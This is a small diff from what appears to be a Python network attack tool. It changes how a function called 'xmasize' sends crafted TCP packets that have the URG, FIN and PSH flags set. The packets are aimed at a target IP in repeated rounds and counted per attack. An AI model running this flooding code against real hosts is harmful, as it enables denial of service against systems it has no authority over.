@@ -65,7 +65,8 @@ def xmasize(ip, sport, rounds, source = None):
             TCP_l.window = window
             TCP_l.flags = "UFP" # ALL FLAGS SET (like a XMAS tree)
             try:
-                s.send(IP_p/TCP_l, verbose=0)
+                # send(IP_p/TCP_l, verbose=0)
+                s.send(IP_p/TCP_l)
                 # print("[Info] [AI] [XMAS] Firing 'ionized quartz' ["+str(n)+"] -> [IONIZING!]")
                 xmas_sent += 1
                 if xmas_sent % REPORT_PER_ATTACK == 0:
